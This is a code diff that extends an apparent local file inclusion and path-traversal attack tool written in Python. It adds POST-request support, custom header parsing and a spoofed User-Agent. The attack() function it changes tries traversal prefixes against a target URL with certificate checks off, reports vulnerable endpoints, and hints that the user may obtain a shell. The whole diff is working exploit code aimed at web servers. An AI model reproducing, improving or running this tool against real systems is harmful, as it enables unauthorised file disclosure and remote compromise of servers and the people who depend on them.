@@ -65,6 +65,32 @@ def cook(cookies):
     return c
 
 
+def parse_headers(header_string):
+    """Parse custom headers from command line format"""
+    if not header_string:
+        return {}
+
+    headers = {}
+    for header in header_string.split(","):
+        if ":" in header:
+            key, value = header.split(":", 1)
+            headers[key.strip()] = value.strip()
+    return headers
+
+
+def parse_post_data(data_string):
+    """Parse POST data from command line format"""
+    if not data_string:
+        return {}
+
+    data = {}
+    for param in data_string.split("&"):
+        if "=" in param:
+            key, value = param.split("=", 1)
+            data[key] = value
+    return data
+
+
 def attack(
     target,
     location,
@@ -96,19 +122,74 @@ def attack(
     """
 
     url = target + location
+
+    # Merge custom headers with default headers
+    request_headers = headers or {}
+    if custom_headers:
+        request_headers.update(custom_headers)
+
+    # Add User-Agent if not specified
+    if "User-Agent" not in request_headers:
+        request_headers["User-Agent"] = (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        )
+
     try:
         if dt:
-            res = requests.get(url, headers=headers, verify=False)
+            if method.upper() == "POST":
+                res = requests.post(
+                    url, headers=request_headers, data=post_data, verify=False
+                )
+            else:
+                res = requests.get(url, headers=request_headers, verify=False)
             if res.status_code == 200:
                 print(colors("[+] Vulnerable: " + url, 92))
 
-        response = requests.get(url, headers=headers, cookies=cookies, verify=False)
+        # Main request
+        if method.upper() == "POST":
+            if post_data:
+                response = requests.post(
+                    url,
+                    headers=request_headers,
+                    cookies=cookies,
+                    data=post_data,
+                    verify=False,
+                )
+            else:
+                # For POST requests without explicit data, put the location in POST body
+                post_body = {"file": location} if not post_data else post_data
+                response = requests.post(
+                    url.split("?")[0],
+                    headers=request_headers,
+                    cookies=cookies,
+                    data=post_body,
+                    verify=False,
+                )
+        else:
+            response = requests.get(
+                url, headers=request_headers, cookies=cookies, verify=False
+            )
 
         if response.status_code != 200:
             print(colors("[!] Unexpected HTTP Response ", 91))
             sys.exit(1)
         if not relative:
-            r = requests.get(url, verify=False)
+            if method.upper() == "POST":
+                if post_data:
+                    r = requests.post(
+                        url, headers=request_headers, data=post_data, verify=False
+                    )
+                else:
+                    post_body = {"file": location}
+                    r = requests.post(
+                        url.split("?")[0],
+                        headers=request_headers,
+                        data=post_body,
+                        verify=False,
+                    )
+            else:
+                r = requests.get(url, headers=request_headers, verify=False)
+
             if r.status_code != 200:
                 if not detection_mode:
                     print(colors("[!] Unexpected HTTP Response ", 91))
@@ -125,16 +206,38 @@ def attack(
             for traversal in PATH_TRAVERSAL:
                 for i in range(10):
                     lfi = target + traversal * i + location
-                    r = requests.get(
-                        lfi, headers=headers, cookies=cookies, verify=False
-                    )
+                    if method.upper() == "POST":
+                        if post_data:
+                            r = requests.post(
+                                lfi,
+                                headers=request_headers,
+                                cookies=cookies,
+                                data=post_data,
+                                verify=False,
+                            )
+                        else:
+                            post_body = {"file": traversal * i + location}
+                            r = requests.post(
+                                target,
+                                headers=request_headers,
+                                cookies=cookies,
+                                data=post_body,
+                                verify=False,
+                            )
+                    else:
+                        r = requests.get(
+                            lfi, headers=request_headers, cookies=cookies, verify=False
+                        )
+
                     if r.status_code != 200:
                         print(colors("[!] Unexpected HTTP Response ", 91))
-            print(
-                colors(
-                    "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91
+            if not detection_mode:
+                print(
+                    colors(
+                        "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ",
+                        91,
+                    )
                 )
-            )
 
         return response
 
